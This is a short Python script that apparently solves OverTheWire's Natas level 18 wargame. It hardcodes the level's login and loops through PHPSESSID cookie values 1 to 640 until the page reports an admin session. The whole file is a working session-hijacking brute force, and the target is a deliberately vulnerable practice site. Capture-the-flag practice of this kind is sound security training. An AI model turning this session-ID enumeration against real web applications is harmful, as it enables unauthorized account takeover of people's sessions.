import requests
import tqdm

url = 'http://natas18.natas.labs.overthewire.org/'
username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'

auth = (username, password)


def main():
    params = {'username': "admin", "password": "admin", "debug": 1}

    for i in tqdm.tqdm(range(1,641)):
        cookies = {'PHPSESSID': f"{i}"}
        response = requests.get(url, params=params, auth=auth, cookies=cookies)
        if response.status_code == 200:
            if "You are an admin" in response.text:
                print(f"admin session id is {i}")
                print(response.text) 
                exit(0)
            pass
        elif response.status_code != 200:
            print(f"status: {response.status_code}")
            raise RuntimeError("Error in query.")


if __name__ == "__main__":
    main()
